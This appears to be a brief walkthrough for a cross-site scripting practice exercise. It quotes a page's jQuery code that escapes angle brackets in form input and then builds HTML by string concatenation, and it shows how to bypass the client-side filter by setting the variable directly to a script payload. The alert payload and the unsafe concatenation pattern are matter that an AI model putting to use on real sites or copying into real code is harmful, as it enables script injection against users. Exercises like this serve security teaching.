Usual XSS in any form

`<script>alert('Ex1');</script>`

doesn't give result, because of replacer in /js/ex1.js

`var siteName = $(".ex1 input[type='text']").val().trim().replace(/</g, "&lt;").replace(/>/g, "&gt;");
 var siteURL = $(".ex1 input[type='url']").val().trim().replace(/</g, "&lt;").replace(/>/g, "&gt;");`

and list 'My site' build by this line

`$("<p class='lead'><span class='label     label-success'>" + siteName + "</span>" + siteURL + "</p>").appendTo(".ex1.links-place");`

so change variable value siteName or siteUrl like this

`var siteName="<script>alert('Ex1')</script>"`

and send form with any value.